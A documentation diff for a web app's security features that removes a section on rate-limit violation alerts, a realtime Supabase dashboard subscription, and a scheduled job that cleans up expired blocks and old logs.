-**Request Body:**
-```json
-{
-  "ipAddress": "192.168.1.100",
-  "endpoint": "chatbot",
-  "rateLimitCount": 7,
-  "windowMinutes": 60,
-  "userAgent": "Mozilla/5.0...",
-  "location": {
-    "city": "San Francisco",
-    "country": "United States"
-  },
-  "timestamp": "2025-01-10T14:30:00Z"
-}
-```
-
-**Response:**
-```json
-{
-  "success": true,
-  "messageId": "msg_abc123",
-  "message": "Rate limit alert sent successfully"
-}
-```
-
-### Integration with Edge Functions
-
-Each edge function that uses rate limiting automatically integrates with the alerting system:
-
-```typescript
-import { 
-  checkRateLimit, 
-  logRateLimitEvent,
-  RATE_LIMIT_CONFIGS 
-} from "../_shared/cors-rate-limit.ts";
-
-// In the handler function:
-const clientIP = getClientIP(req);
-const rateLimit = checkRateLimit(clientIP, RATE_LIMIT_CONFIGS.chatbot);
-
-// This function now tracks violations and sends alerts automatically
-await logRateLimitEvent(clientIP, 'chatbot', rateLimit.allowed, rateLimit.remaining, req);
-
-if (!rateLimit.allowed) {
-  return rateLimitExceededResponse(origin, rateLimit.resetIn);
-}
-```
-
-The `logRateLimitEvent` function handles:
-1. Logging the rate limit event to console
-2. Tracking violations per IP/endpoint
-3. Checking if alert threshold is met
-4. Sending email alert if conditions are met
-5. Managing alert cooldown to prevent spam
-6. Persisting violations to database for dashboard visibility
-
-### Real-Time Dashboard Updates
-
-The Rate Limit Violations dashboard uses Supabase Realtime subscriptions to automatically update when new violations occur or existing ones are modified.
-
-#### Realtime Architecture
-
-```mermaid
-flowchart LR
-    subgraph Edge["Edge Function"]
-        EF[Rate Limited Request]
-        DB_INSERT[Insert/Update Violation]
-    end
-
-    subgraph Supabase["Supabase Realtime"]
-        PUB[supabase_realtime Publication]
-        CHANNEL[rate_limit_violations Channel]
-    end
-
-    subgraph Dashboard["Owner Dashboard"]
-        SUB[Realtime Subscription]
-        QUERY[React Query Invalidation]
-        UI[UI Update + Toast]
-    end
-
-    EF --> DB_INSERT
-    DB_INSERT --> PUB
-    PUB --> CHANNEL
-    CHANNEL --> SUB
-    SUB --> QUERY
-    QUERY --> UI
-```
-
-**Figure RL-2: Realtime Updates Flow** - Shows how database changes propagate to the dashboard in real-time.
-
-#### Realtime Implementation
-
-The dashboard subscribes to postgres_changes on the `rate_limit_violations` table:
-
-```typescript
-import { useEffect } from "react";
-import { supabase } from "@/integrations/supabase/client";
-import { useQueryClient } from "@tanstack/react-query";
-
-// Inside component
-const queryClient = useQueryClient();
-
-useEffect(() => {
-  const channel = supabase
-    .channel('rate-limit-violations-realtime')
-    .on(
-      'postgres_changes',
-      {
-        event: '*',  // Listen to INSERT, UPDATE, DELETE
-        schema: 'public',
-        table: 'rate_limit_violations',
-      },
-      (payload) => {
-        console.log('Rate limit violation change:', payload);
-        
-        if (payload.eventType === 'INSERT') {
-          toast.warning(`New rate limit violation from ${payload.new.ip_address}`);
-        } else if (payload.eventType === 'UPDATE' && payload.new.is_blocked) {
-          toast.info(`IP ${payload.new.ip_address} has been blocked`);
-        }
-        
-        // Invalidate query to refresh data
-        queryClient.invalidateQueries({ queryKey: ['rate-limit-violations'] });
-      }
-    )
-    .subscribe();
-
-  return () => {
-    supabase.removeChannel(channel);
-  };
-}, [queryClient]);
-```
-
-#### Database Configuration
-
-Realtime is enabled via a migration that adds the table to the `supabase_realtime` publication:
-
-```sql
--- Enable realtime for rate_limit_violations table
-ALTER PUBLICATION supabase_realtime ADD TABLE public.rate_limit_violations;
-```
-
-#### User Experience
-
-When realtime updates occur:
-- **New Violation**: Warning toast appears with IP address
-- **IP Blocked**: Info toast confirms the block
-- **Any Change**: Dashboard data refreshes automatically without manual refresh
-
-### Automatic Cleanup Job
-
-The `cleanup-expired-blocks` edge function runs periodic cleanup to maintain database hygiene.
-
-#### Cleanup Schedule
-
-| Data Type | Retention Period | Action |
-|-----------|-----------------|--------|
-| Rate Limit Violations | 30 days | Delete |
-| Expired IP Blocks | Past expiration | Deactivate |
-| Login Attempts | 90 days | Delete |
-| Visitor Activity | 60 days | Delete |
-
-#### Cleanup Edge Function
-
-**Endpoint:** `POST /functions/v1/cleanup-expired-blocks`
-
-**Response:**
-```json
-{
-  "success": true,
-  "message": "Cleanup completed successfully",
-  "summary": {
-    "expiredBlocksDeactivated": 3,
-    "rateLimitViolationsDeleted": 45,
-    "oldLoginAttemptsDeleted": 120,
-    "oldVisitorActivityDeleted": 500,
-    "cleanupTime": "2025-01-10T00:00:00Z"
-  }
-}
-```
-
-#### Scheduling Cleanup
-
-The cleanup function can be scheduled via:
-1. **Supabase Cron**: Set up a pg_cron job to call the function daily
-2. **External Scheduler**: Use a service like cron-job.org
-3. **Manual Trigger**: Call via Owner Dashboard when needed
+The following section provides detailed documentation of the Known Login Locations System's architecture and implementation.
 
 ---
 
